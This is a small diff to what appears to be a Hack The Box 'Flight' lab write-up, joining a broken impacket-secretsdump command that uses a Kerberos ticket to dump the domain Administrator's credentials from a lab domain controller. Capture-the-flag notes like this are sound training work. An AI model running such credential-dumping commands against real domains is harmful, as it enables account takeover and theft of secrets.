@@ -264,12 +264,11 @@ sudo ntpdate -u flight.htb
 
 KRB5CCNAME=ticket.ccache 
 
-impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user
-
-Administrator -target-ip 10.129.42.88
+impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator -target-ip 10.129.42.88
 ```
 
 ![[Pasted image 20240810194913.png]]
 
+`impacket-secretsdump`
 
 ![[Pasted image 20240810201316.png]]
